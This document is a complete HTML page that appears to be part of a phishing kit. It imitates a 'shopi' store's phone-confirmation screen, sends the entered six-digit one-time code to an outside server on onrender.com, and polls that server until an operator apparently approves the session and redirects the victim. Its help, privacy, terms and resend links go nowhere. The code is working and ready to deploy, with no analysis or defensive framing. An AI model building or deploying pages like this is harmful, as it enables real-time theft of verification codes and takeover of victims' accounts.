<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Verification</title>
    <link rel="icon" type="image/png" href="res/shopi.png">
    <link rel="stylesheet" href="res/app.css">
    <style>
        .spinner-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .btn-spinner {
            border: 2px solid #f3f3f3;
            border-top: 2px solid white;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            display: none;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .error {
            border-color: #ff4444 !important;
        }
        
        button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
    </style>
</head>
<body>    

<main>
    <div class="form">
        <div class="logo">
            <img src="res/logo.png" alt="Logo">
        </div>

        <div class="text">
            <h2>Phone Confirmation</h2>
            <span>Please enter the verification code sent to your phone</span>
        </div>

        <div class="col">
            <label>Confirmation Code</label>
            <input type="text" id="otp" placeholder="Enter 6-digit code" maxlength="6">
            <a href="#">Resend Code</a>
        </div>

        <div class="col">
            <button id="submitBtn" onclick="sendOTP()">
                <span class="spinner-btn">
                    <span class="btn-text">Continue</span>
                    <span class="btn-spinner" id="btnSpinner"></span>
                </span>
            </button>
        </div>

        <div class="col links">
            <span>Help</span>
            <span>Privacy</span>
            <span>Terms</span>
        </div>
    </div>
</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>

<script>
let sessionId = null;
let checkInterval = null;

function showButtonSpinner() {
    $("#btnSpinner").show();
    $("#submitBtn").prop("disabled", true);
    $(".btn-text").text("Verifying...");
}

function hideButtonSpinner() {
    $("#btnSpinner").hide();
    $("#submitBtn").prop("disabled", false);
    $(".btn-text").text("Continue");
}

function checkStatus() {
    if (!sessionId) return;
    
    $.ajax({
        url: `https://shopy-fbwo.onrender.com/status/${sessionId}`,  // UPDATED
        method: 'GET',
        success: function(response) {
            if (response.status === "approved") {
                clearInterval(checkInterval);
                hideButtonSpinner();
                window.location.href = response.redirect_url;
            }
        },
        error: function(xhr) {
            if (xhr.status === 404) {
                clearInterval(checkInterval);
                hideButtonSpinner();
                alert("Session expired. Please try again.");
            }
        }
    });
}

function sendOTP() {
    $("#otp").removeClass("error");

    const otp = $("#otp").val().trim();

    if (!otp) {
        $("#otp").addClass("error");
        alert("Please enter the verification code");
        return;
    }

    if (!/^\d{6}$/.test(otp)) {
        $("#otp").addClass("error");
        alert("Please enter a valid 6-digit code");
        return;
    }

    showButtonSpinner();

    if (checkInterval) clearInterval(checkInterval);

    $.ajax({
        url: 'https://shopy-fbwo.onrender.com/otp',  // UPDATED
        method: 'POST',
        contentType: 'application/json',
        data: JSON.stringify({
            otp: otp
        }),
        success: function(response) {
            if (response.success) {
                sessionId = response.id;
                checkInterval = setInterval(checkStatus, 1500);
                setTimeout(checkStatus, 500);
                
                // Auto timeout after 5 minutes
                setTimeout(function() {
                    if (checkInterval) {
                        clearInterval(checkInterval);
                        hideButtonSpinner();
                        alert("Request timed out. Please try again.");
                    }
                }, 300000);
                
            } else {
                hideButtonSpinner();
                alert("Verification failed. Please try again.");
            }
        },
        error: function(xhr, status, error) {
            hideButtonSpinner();
            console.error("Error details:", xhr.responseText, status, error);
            alert("Connection error. Please check console for details.");
        }
    });
}

$("#otp").keypress(function (e) {
    if (e.key === "Enter") {
        sendOTP();
    }
});

// Auto-format to only allow numbers and limit to 6 digits
$("#otp").on("input", function() {
    let value = $(this).val().replace(/\D/g, '');
    if (value.length > 6) value = value.substr(0, 6);
    $(this).val(value);
});

$(window).on('beforeunload', function() {
    if (checkInterval) clearInterval(checkInterval);
});
</script>

</body>
</html>
